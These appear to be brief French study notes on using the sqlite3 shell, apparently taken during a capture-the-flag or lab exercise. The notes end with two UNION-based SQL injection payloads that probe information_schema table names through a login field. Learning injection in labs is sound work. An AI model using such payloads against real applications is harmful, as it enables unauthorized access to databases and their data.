SQLITE 3 :
Exploitation de DataBase

sqlite3 example.db				Ouvrir un fichier (n'a pas l'ai de marcher si le
						fichier est encrypté

sqlite > .tables				Pour acceder aux noms des tables
sqlite > PRAGMA table_info(customers);		Pour accéder aux attributs d'une table


admettons que cela renvoie la table customers
sqlite > SELECT * FROM customers;		On peut rentrer des requêtes sql (comme
						on a appris au lycée letss gooo)
						
						
admin12' UNION Select 1,2,group_concat(table_name) from information_schema.tables where table_schema = 'sqli_three' and table_name like 'pasklenfkje';--
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
